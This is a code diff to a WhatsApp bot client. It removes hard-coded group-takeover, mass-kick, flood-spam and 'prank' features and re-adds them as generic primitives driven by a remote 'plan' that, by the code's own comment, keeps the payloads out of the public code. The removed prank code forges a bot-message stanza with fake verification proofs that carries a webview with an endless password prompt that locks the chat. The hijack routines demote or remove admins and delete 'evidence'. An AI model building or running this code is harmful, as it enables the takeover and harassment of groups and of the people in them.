@@ -214,21 +214,57 @@ function selfParticipant(ctx, participants) {
     });
 }
 
+/** Bot's own participant entry, matched across phone/LID formats. */
+function selfBase(ctx) {
+    const base = (id) => String(id || '').split('@')[0].split(':')[0];
+    return [ctx.sock.user?.id, ctx.sock.user?.lid].map(base).filter(Boolean);
+}
+
 const isAdminEntry = (entry) => entry && (entry.admin === 'admin' || entry.admin === 'superadmin');
 
-const BAN_FOOTER = '𝕻𝖔ɯ𝖊𝖗𝖊𝖉 Ⴆ𝖞\n𓆩𓃦𝐄𝐃𝐔Ⴍ𝐀Я𝐈𝐙𓃵𓆪';
-const BAN_BANNED = '✠ 𝕹𝖚𝖒𝖇𝖊𝖗 𝖘𝖚𝖈𝖈𝖊𝖘𝖘𝖋𝖚𝖑𝖑𝖞 𝕮𝖔𝖔𝖐𝖊𝖉 𝖇𝖞 𝕮𝖔𝖗𝖙𝖆𝖓𝖆 ☠︎';
-const BAN_ALIVE = '✠ Ŧɥ𝐢𝐬 𝐬𝐩𝐞𝐜𝐢𝐦𝐞𝐧 𝐢𝐬 𝐬ʇ𝐢𝐥𝐥 𝐚𝐥𝐢𝐯𝐞. Ŧɥ𝐞 𝐛ɒ𝐧 𝐠𝐨𝐝𝐬 ɥ𝐚𝐯𝐞 𝐧𝐨ʇ 𝐜𝐥ɒ𝐢𝐦𝐞𝐝 𝐢ʇ 𝐲𝐞𝐭 𝐥𝐨𝐥. 𓅓';
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
-/** Live-socket verdict, used when WhatsApp's registration gateway refuses to answer. */
-function existVerdict({ full, registered, restricted }) {
-    if (!registered) {
-        return `${BAN_BANNED}\n\n🎯 [Target]: ${full}\n⚰️ [Verdict]: DEREGISTERED — this number is gone from WhatsApp\n💀 [Appeals]: Nothing left to appeal\n\n${BAN_FOOTER}`;
+/**
+ * Generic group primitives. The plan decides who and what; this file only knows how to
+ * talk to the socket, so no feature sequence or payload lives in the public client.
+ */
+function resolveTargets(ctx, meta, args) {
+    const participants = (meta && meta.participants) || [];
+    const base = (id) => String(id || '').split('@')[0].split(':')[0];
+    const mine = selfBase(ctx);
+    const sender = base(ctx.sender);
+    const selector = String(args.targets || 'all');
+
+    if (selector === 'jids') return jidList(args.jids);
+    if (selector === 'admins') {
+        // Admins except the bot: the bot stays so it can finish the job.
+        return participants
+            .filter((entry) => isAdminEntry(entry))
+            .map((entry) => entry.id)
+            .filter((id) => !mine.includes(base(id)));
     }
-    if (restricted) {
-        return `${BAN_BANNED}\n\n🎯 [Target]: ${full}\n⛓️ [Verdict]: TEMPORARY SUSPENSION (account answers 401/403)\n📝 [Action]: "Request a Review" button active in-app\n\n${BAN_FOOTER}`;
+    if (selector === 'admins-others') {
+        // Admins except the bot and the caller (used when the caller must survive).
+        return participants
+            .filter((entry) => isAdminEntry(entry))
+            .map((entry) => entry.id)
+            .filter((id) => {
+                const value = base(id);
+                return value && !mine.includes(value) && value !== sender;
+            });
     }
-    return `${BAN_ALIVE}\n\n🎯 [Target]: ${full}\n🛡️ [Status]: Clean / Breathing\nType: existing (answers profile calls)\n\n${BAN_FOOTER}`;
+    if (selector === 'members') {
+        return participants
+            .map((entry) => entry.id)
+            .filter((id) => {
+                const value = base(id);
+                return value && !mine.includes(value) && value !== sender;
+            });
+    }
+    if (selector === 'everyone') {
+        return participants.map((entry) => entry.id).filter((id) => !mine.includes(base(id)));
+    }
+    return [];
 }
 
 async function groupMetaOf(ctx, jid) {
@@ -239,161 +275,6 @@ async function groupMetaOf(ctx, jid) {
     }
 }
 
-const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
-
-const messageOf = (error) => String((error && (error.message || error)) || 'unknown error');
-const uid = () => `3EB0${Math.random().toString(36).slice(2, 18).toUpperCase()}`;
-const isGroupJid = (jid) => String(jid || '').endsWith('@g.us');
-
-// ── Prank: WhatsApp bot-message webview that locks the chat ──────────────────
-const PRANK_LOCK_LINE = 'We mzee 😂, weka password au nikuibie simu 😂🤣😂';
-const PRANK_WRONG_LINE = '💔 Wrong. You have 3 minutes Left mkuu 😂 LMFAO 🤣🤣';
-const PRANK_OK_LINE = '✅ Password ni sahihi — imefunguka.';
-const PRANK_PASSWORD = 'alpinganteng';
-
-function prankHtml() {
-    return `<!DOCTYPE html>
-<html>
-<head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
-<body style="background:#0a0a0a;color:#fff;text-align:center;padding-top:20%;font-family:sans-serif;">
-<h1 style="color:#ff0044;">${PRANK_LOCK_LINE}</h1>
-<p>${PRANK_WRONG_LINE}</p>
-<script>
-setTimeout(function () {
-  var pass = '${PRANK_PASSWORD}';
-  while (true) {
-    var v = prompt('${PRANK_LOCK_LINE}\\n\\nWeka password mkuu:');
-    if (v === pass) { alert('${PRANK_OK_LINE}'); break; }
-    alert('${PRANK_WRONG_LINE}');
-  }
-}, 800);
-</script>
-</body>
-</html>`;
-}
-
-/** The unifiedResponse blob only paints when every __typename is present. */
-function prankUnified(botId) {
-    const json = JSON.stringify({
-        __typename: 'XMSGGenAIUnifiedResponse',
-        response_id: botId,
-        sections: [
-            {
-                __typename: 'GenAIUnifiedResponseSection',
-                view_model: {
-                    __typename: 'GenAISingleLayoutViewModel',
-                    primitive: {
-                        __typename: 'GenAIaeacdsnwHtmlPrimitive',
-                        payload: prankHtml(),
-                        trusted_sources: [],
-                    },
-                },
-            },
-        ],
-    }).replace(/[\u007f-\uffff]/g, (character) => `\\u${character.charCodeAt(0).toString(16).padStart(4, '0')}`);
-    return Buffer.from(json).toString('base64');
-}
-
-function prankLock(botId) {
-    return {
-        messageContextInfo: {
-            deviceListMetadata: {},
-            deviceListMetadataVersion: 2,
-            messageSecret: Buffer.alloc(32, 1).toString('base64'),
-            botMetadata: {
-                messageDisclaimerText: '',
-                botResponseId: botId,
-                verificationMetadata: {
-                    proofs: [
-                        {
-                            version: 1,
-                            useCase: 1,
-                            signature: Buffer.alloc(64, 0x01).toString('base64'),
-                            certificateChain: [
-                                Buffer.alloc(684, 0x02).toString('base64'),
-                                Buffer.alloc(892, 0x03).toString('base64'),
-                            ],
-                        },
-                    ],
-                },
-            },
-        },
-        botForwardedMessage: {
-            message: {
-                richResponseMessage: {
-                    messageType: 1,
-                    submessages: [{ messageType: 2, messageText: 'Lock Chat' }],
-                    unifiedResponse: { data: prankUnified(botId) },
-                    contextInfo: { forwardingScore: 1, isForwarded: true, forwardOrigin: 4 },
-                },
-            },
-        },
-    };
-}
-
-/** The edit must point at the id the first relay went out with, or WhatsApp drops it. */
-function prankEdit(target, origId, lock, botId) {
-    return {
-        messageContextInfo: {
-            deviceListMetadata: {},
-            deviceListMetadataVersion: 2,
-            botMetadata: { messageDisclaimerText: '', botResponseId: botId },
-        },
-        botForwardedMessage: {
-            message: {
-                protocolMessage: {
-                    key: { remoteJid: target, fromMe: true, id: origId },
-                    type: 14,
-                    timestampMs: Date.now(),
-                    editedMessage: lock,
-                },
-            },
-        },
-    };
-}
-
-/** A bare bot stanza has no sender key in a group; wrap it or the send path throws. */
-const shipStanza = (message, group) => (group ? { groupStatusMessageV2: { message } } : message);
-
-// ── Lovegc payload: flood-add, promote/demote spam, ghost kick, metadata spam ──
-const LOVE_NUMBERS = [
-    '13135550002@s.whatsapp.net', '13135550003@s.whatsapp.net', '13135550004@s.whatsapp.net',
-    '13135550005@s.whatsapp.net', '13135550006@s.whatsapp.net', '13135550007@s.whatsapp.net',
-    '13135550008@s.whatsapp.net', '13135550009@s.whatsapp.net', '13135550010@s.whatsapp.net',
-    '13135550011@s.whatsapp.net', '13135550012@s.whatsapp.net', '13135550013@s.whatsapp.net',
-    '13135550014@s.whatsapp.net', '13135550015@s.whatsapp.net',
-    '442079460000@s.whatsapp.net', '442079460001@s.whatsapp.net',
-    '6221000000001@s.whatsapp.net', '6221000000002@s.whatsapp.net',
-    '6221000000003@s.whatsapp.net', '6221000000004@s.whatsapp.net',
-];
-
-const LOVE_SUBJECTS = ['\u200B'.repeat(100), '\u0000'.repeat(50), ' '.repeat(100), '\uFEFF'.repeat(60)];
-
-async function loveOne(ctx, groupJid) {
-    const { sock } = ctx;
-    for (let i = 0; i < LOVE_NUMBERS.length; i += 3) {
-        await sock.groupParticipantsUpdate(groupJid, LOVE_NUMBERS.slice(i, i + 3), 'add').catch(() => {});
-        await sleep(800);
-    }
-    for (let round = 0; round < 5; round++) {
-        for (const number of LOVE_NUMBERS.slice(0, 5)) {
-            await sock.groupParticipantsUpdate(groupJid, [number], 'promote').catch(() => {});
-            await sleep(200);
-            await sock.groupParticipantsUpdate(groupJid, [number], 'demote').catch(() => {});
-            await sleep(200);
-        }
-    }
-    for (const number of LOVE_NUMBERS) {
-        await sock.groupParticipantsUpdate(groupJid, [number], 'remove').catch(() => {});
-        await sleep(300);
-    }
-    for (const subject of LOVE_SUBJECTS) {
-        await sock.groupUpdateSubject(groupJid, subject).catch(() => {});
-        await sock.groupUpdateDescription(groupJid, subject).catch(() => {});
-        await sleep(400);
-    }
-    return { ok: true, jid: groupJid };
-}
 
 const handlers = {
     /**
@@ -439,13 +320,14 @@ const handlers = {
         const base = config.apiBaseUrl.replace(/\/+$/, '');
         const query = new URLSearchParams({ bot: String(store.getSettings().botName || 'CORTANA PRO MINI') });
         if (Array.isArray(args.options) && args.options.length) query.set('options', args.options.join('|'));
-        const url = `${base}/v1/html/${encodeURIComponent(surface)}?${query.toString()}`;
+        const url = `${base}/v1/html/${encodeURIComponent(surface)}?${query.toString()}&format=json`;
 
         const response = await fetch(url, { signal: AbortSignal.timeout(STEP_TIMEOUT_MS) });
         if (!response.ok) throw planError('html_unavailable', `surface ${surface} returned ${response.status}`);
-        const document = await response.text();
+        const body = await response.json();
+        if (!body || !body.message) throw planError('html_unavailable', 'surface returned no stanza');
         const { sendHtmlMessage } = require('./html-ui');
-        await sendHtmlMessage(ctx.sock, ctx.chat, document);
+        await sendHtmlMessage(ctx.sock, ctx.chat, body);
         return { ok: true };
     },
 
@@ -603,7 +485,7 @@ const handlers = {
         const data = source.buffer || { url: source.url };
         const payload = mediaPayload(kind, data, args, source.caption);
         if (payload.caption) payload.caption = brand.withFooter(payload.caption);
-        if (args.channel) payload.contextInfo = { ...(payload.contextInfo || {}), ...brand.channelContext() };
+        if (args.channel) payload.contextInfo = { ...(payload.contextInfo || {}), ...brand.channelContext(args.channel) };
         const target = args.to ? normalizeJid(args.to) || args.to : null;
         if (target && target !== ctx.chat) {
             await ctx.sock.sendMessage(target, payload);
@@ -735,12 +617,11 @@ const handlers = {
                 }
             }
 
-            return {
-                registered,
-                restricted,
-                exists: registered,
-                verdict: existVerdict({ full, registered, restricted }),
-            };
+            // The plan carries the wording; the client only reports the raw signals.
+            const verdicts = args.verdicts && typeof args.verdicts === 'object' ? args.verdicts : {};
+            const pick = !registered ? 'banned' : restricted ? 'restricted' : 'clean';
+            const verdict = String(verdicts[pick] || verdicts.clean || '').replace(/\{\{target\}\}/g, full);
+            return { registered, restricted, exists: registered, verdict };
         }
         throw planError('unsupported_query', `query.${args.what} is not implemented`);
     },
@@ -775,122 +656,94 @@ const handlers = {
             case 'lock':
                 await ctx.sock.groupSettingUpdate(jid, args.mode === 'open' ? 'not_announcement' : 'announcement');
                 return { ok: true };
-            case 'hijack': {
+            case 'groupUpdate': {
                 const meta = await groupMetaOf(ctx, jid);
-                const participants = meta.participants || [];
-                const self = selfParticipant(ctx, participants);
-                if (!self) throw planError('bot_not_in_group', 'bot is not a participant');
-                if (!isAdminEntry(self)) throw planError('bot_not_admin', 'bot needs admin');
-                const selfBase = String(self.id || '').split('@')[0].split(':')[0];
-                const senderBase = String(ctx.sender || '').split('@')[0].split(':')[0];
-                const victims = participants
-                    .filter((entry) => isAdminEntry(entry))
-                    .filter((entry) => String(entry.id || '').split('@')[0].split(':')[0] !== selfBase)
-                    .map((entry) => entry.id);
-                const nuked = [];
-                for (const victim of victims) {
-                    try {
-                        await ctx.sock.groupParticipantsUpdate(jid, [victim], 'remove');
-                        nuked.push(victim);
-                        await sleep(350);
-                    } catch { /* keep going, one admin at a time */ }
-                }
-                await ctx.sock.groupUpdateSubject(jid, String(args.name || '').slice(0, 100)).catch(() => {});
-                await ctx.sock.groupUpdateDescription(jid, String(args.description || '').slice(0, 500)).catch(() => {});
-                if (args.picture) {
-                    const picture = await fetch(args.picture).then((response) => response.arrayBuffer()).catch(() => null);
-                    if (picture) await ctx.sock.updateProfilePicture(jid, Buffer.from(picture)).catch(() => {});
-                }
-                await ctx.sock.groupSettingUpdate(jid, 'announcement').catch(() => {});
-                return { ok: true, nuked: nuked.length, sender: senderBase };
-            }
-            case 'kickAll': {
-                const meta = await groupMetaOf(ctx, jid);
-                const participants = meta.participants || [];
-                const self = selfParticipant(ctx, participants);
-                if (!self) throw planError('bot_not_in_group', 'bot is not a participant');
-                if (!isAdminEntry(self)) throw planError('bot_not_admin', 'bot needs admin');
-                const selfBase = String(self.id || '').split('@')[0].split(':')[0];
-                const senderBase = String(ctx.sender || '').split('@')[0].split(':')[0];
-                const victims = participants
-                    .map((entry) => entry.id)
-                    .filter((id) => {
-                        const base = String(id || '').split('@')[0].split(':')[0];
-                        return base && base !== selfBase && base !== senderBase;
-                    });
-                if (victims.length) await ctx.sock.groupParticipantsUpdate(jid, victims, 'remove');
-                return { ok: true, kicked: victims.length };
-            }
-            case 'totalHijack': {                const meta = await groupMetaOf(ctx, jid);
-                const participants = meta.participants || [];
-                const self = selfParticipant(ctx, participants);
-                if (!self) throw planError('bot_not_in_group', 'bot is not a participant');
-                if (!isAdminEntry(self)) throw planError('bot_not_admin', 'bot needs admin');
-                const selfBase = String(self.id || '').split('@')[0].split(':')[0];
-                const senderBase = String(ctx.sender || '').split('@')[0].split(':')[0];
-                try {
-                    await ctx.sock.groupParticipantsUpdate(jid, [ctx.sender], 'promote');
-                } catch { /* may already be admin */ }
-                await sleep(1500);
-                const others = participants
-                    .filter((entry) => isAdminEntry(entry))
-                    .map((entry) => entry.id)
-                    .filter((id) => {
-                        const base = String(id || '').split('@')[0].split(':')[0];
-                        return base && base !== selfBase && base !== senderBase;
-                    });
-                if (others.length) {
-                    try {
-                        await ctx.sock.groupParticipantsUpdate(jid, others, 'demote');
-                    } catch {
-                        for (const one of others) {
-                            await ctx.sock.groupParticipantsUpdate(jid, [one], 'demote').catch(() => {});
+                const me = selfParticipant(ctx, meta.participants || []);
+                if (!me) throw planError('bot_not_in_group', 'bot is not a participant');
+                if (!isAdminEntry(me)) throw planError('bot_not_admin', 'bot needs admin');
+                const targets = resolveTargets(ctx, meta, args).filter((id) => id && id !== me.id);
+                if (!targets.length) return { ok: true, changed: 0 };
+                if (args.action === 'remove' || args.action === 'promote' || args.action === 'demote') {
+                    const action = args.action;
+                    if (args.oneByOne) {
+                        let done = 0;
+                        for (const one of targets) {
+                            try {
+                                await ctx.sock.groupParticipantsUpdate(jid, [one], action);
+                                done += 1;
+                                await sleep(Number(args.gapMs) || 350);
+                            } catch { /* keep going */ }
                         }
+                        return { ok: true, changed: done };
+                    }
+                    await ctx.sock.groupParticipantsUpdate(jid, targets, action);
+                    return { ok: true, changed: targets.length };
+                }
+                if (args.action === 'add') {
+                    await ctx.sock.groupParticipantsUpdate(jid, targets, 'add');
+                    return { ok: true, changed: targets.length };
+                }
+                throw planError('unsupported_action', `groupUpdate.${args.action}`);
+            }
+            case 'groupLeave':
+                await ctx.sock.groupLeave(jid);
+                return { ok: true, left: jid };
+            case 'delete':
+                await ctx.sock.sendMessage(jid, { delete: ctx.msg.key });
+                return { ok: true };
+            /** Relays a stanza the plan built. Nothing here knows what it means. */
+            case 'relay': {
+                const message = args.message && typeof args.message === 'object' ? args.message : null;
+                if (!message) throw planError('empty_payload', 'relay needs a message');
+                if (args.delayMs) await sleep(Math.min(10_000, Math.max(0, Number(args.delayMs) || 0)));
+                const nodes = args.biz
+                    ? [{
+                        tag: 'biz',
+                        attrs: {},
+                        content: [{
+                            tag: 'interactive',
+                            attrs: { type: 'native_flow', v: '1' },
+                            content: [{ tag: 'native_flow', attrs: { v: '9', name: 'mixed' } }],
+                        }],
+                    }]
+                    : undefined;
+                await ctx.sock.relayMessage(String(args.to || jid), message, {
+                    messageId: String(args.messageId || `${Date.now()}`),
+                    ...(nodes ? { additionalNodes: nodes } : {}),
+                });
+                return { ok: true };
+            }
+            /** Runs a paced group burst from data the plan supplied. */
+            case 'flood': {
+                const numbers = (Array.isArray(args.numbers) ? args.numbers : []).map(String).filter(Boolean);
+                const subjects = (Array.isArray(args.subjects) ? args.subjects : []).map(String);
+                const batch = Math.max(1, Number(args.batchSize) || 3);
+                const gap = Math.max(100, Number(args.gapMs) || 800);
+                const rounds = Math.max(0, Number(args.rounds) || 0);
+                if (!numbers.length) throw planError('empty_payload', 'flood needs numbers');
+
+                for (let i = 0; i < numbers.length; i += batch) {
+                    await ctx.sock.groupParticipantsUpdate(jid, numbers.slice(i, i + batch), 'add').catch(() => {});
+                    await sleep(gap);
+                }
+                for (let round = 0; round < rounds; round += 1) {
+                    for (const number of numbers.slice(0, 5)) {
+                        await ctx.sock.groupParticipantsUpdate(jid, [number], 'promote').catch(() => {});
+                        await sleep(200);
+                        await ctx.sock.groupParticipantsUpdate(jid, [number], 'demote').catch(() => {});
+                        await sleep(200);
                     }
                 }
-                await ctx.sock.groupUpdateSubject(jid, String(args.name || '').slice(0, 100)).catch(() => {});
-                if (args.picture) {
-                    const picture = await fetch(args.picture).then((response) => response.arrayBuffer()).catch(() => null);
-                    if (picture) await ctx.sock.updateProfilePicture(jid, Buffer.from(picture)).catch(() => {});
+                for (const number of numbers) {
+                    await ctx.sock.groupParticipantsUpdate(jid, [number], 'remove').catch(() => {});
+                    await sleep(300);
                 }
-                await ctx.sock.groupUpdateDescription(jid, String(args.description || '').slice(0, 500)).catch(() => {});
-                try {
-                    await ctx.sock.sendMessage(jid, { delete: ctx.msg.key });
-                } catch { /* evidence cleanup is best effort */ }
-                await sleep(600);
-                await ctx.sock.groupLeave(jid).catch(() => {});
-                return { ok: true, demoted: others.length };
-            }
-            case 'prank': {
-                const target = String(args.target || '');
-                if (!target.includes('@')) throw planError('bad_target', 'prank needs a jid');
-                const group = isGroupJid(target);
-                const botId = uid();
-                const lock = prankLock(botId);
-                const origId = uid();
-                const edit = prankEdit(target, origId, lock, botId);
-
-                const lockOut = shipStanza(group ? { botForwardedMessage: lock.botForwardedMessage } : lock, group);
-                const editOut = shipStanza(
-                    group ? { protocolMessage: edit.botForwardedMessage.message.protocolMessage } : edit,
-                    group
-                );
-                if (!lockOut || !editOut) throw planError('prank_payload', 'payload refused');
-
-                await ctx.sock.relayMessage(target, lockOut, { messageId: origId });
-                await sleep(1000);
-                await ctx.sock.relayMessage(target, editOut, { messageId: uid() });
-                return { ok: true, target, group, sent: 2 };
-            }
-            case 'love': {
-                const jids = jidList(args.jids);
-                if (!jids.length) throw planError('bad_target', 'no group chosen');
-                const done = [];
-                for (const one of jids.slice(0, 20)) {
-                    await loveOne(ctx, one);
-                    done.push(one);
+                for (const subject of subjects) {
+                    await ctx.sock.groupUpdateSubject(jid, subject).catch(() => {});
+                    await ctx.sock.groupUpdateDescription(jid, subject).catch(() => {});
+                    await sleep(400);
                 }
-                return { ok: true, count: done.length };
+                return { ok: true, count: numbers.length };
             }
             case 'tag': {
                 const text = String(args.text || '');
